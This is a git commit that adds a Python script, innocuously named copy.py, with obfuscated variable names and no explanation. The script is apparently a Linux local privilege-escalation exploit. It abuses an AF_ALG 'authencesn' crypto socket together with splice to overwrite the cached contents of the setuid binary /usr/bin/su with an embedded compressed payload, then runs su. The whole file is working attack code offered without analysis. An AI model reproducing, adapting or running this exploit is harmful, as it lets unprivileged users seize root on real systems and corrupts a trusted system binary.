bd03174b2d9c444ea13189d9b82e7ec7732ab0d3
hawoca <cong0tiankaishi@gmail.com>
2026-06-11 23:07:36 +0800

    Add files via upload

---
+++ copy.py
@@ -0,0 +1,45 @@
+#!/usr/bin/env python3
+import os as g, zlib, socket as s, ctypes
+
+libc = ctypes.CDLL("libc.so.6")
+c_loff_t = ctypes.c_longlong
+
+def d(x): return bytes.fromhex(x)
+
+def c(f, t, c_bytes):
+    a = s.socket(38, 5, 0)
+    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
+    h = 279
+    v = a.setsockopt
+    v(h, 1, d('0800010000000010' + '0'*64))
+    v(h, 5, None, 4)
+    u, _ = a.accept()
+    o = t + 4
+    i = d('00')
+    u.sendmsg([b"A"*4 + c_bytes], [(h, 3, i*4), (h, 2, b'\x10'+i*19), (h, 4, b'\x08'+i*3)], 32768)
+    
+    r, w = g.pipe()
+    off_in = ctypes.byref(c_loff_t(0))
+    libc.splice(f, off_in, w, None, o, 0)
+    libc.splice(r, None, u.fileno(), None, o, 0)
+    
+    try:
+        u.recv(8 + t)
+    except:
+        pass
+
+TARGET = "/usr/bin/su" 
+
+try:
+    f = g.open(TARGET, 0)
+except FileNotFoundError:
+    exit(1)
+
+i = 0
+e = zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
+
+while i < len(e):
+    c(f, i, e[i:i+4])
+    i += 4
+
+g.system(TARGET)
